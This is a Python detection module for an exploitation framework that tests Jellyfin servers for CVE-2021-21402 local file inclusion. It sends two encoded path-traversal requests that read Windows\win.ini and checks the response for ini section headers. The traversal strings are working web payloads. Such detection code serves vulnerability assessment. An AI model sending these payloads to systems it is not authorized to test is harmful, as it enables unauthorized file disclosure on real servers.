#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jellyfin before 10."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jellyfin <10.7.0 - Local File Inclusion Detection',
        'description': 'Jellyfin before 10.7.0 is vulnerable to local file inclusion. This issue is more prevalent when Windows is used as the host OS. Servers exposed to public Internet are potentially at risk.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'jellyfin', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/',
            'https://github.com/jellyfin/jellyfin/security/advisories/GHSA-wg4c-c9g9-rxhx',
            'https://github.com/jellyfin/jellyfin/releases/tag/v10.7.1',
            'https://github.com/jellyfin/jellyfin/commit/0183ef8e89195f420c48d2600bc0b72f6d3a7fd7',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21402',
        ],
        'cve': 'CVE-2021-21402',
    }

    def run(self):
        for path in ('/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/', '/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('Content-Type: application/octet-stream',)
            body_regexes = ('\\[(font|extension|file)s\\]',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='medium',
                    reason="Jellyfin <10.7.0 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

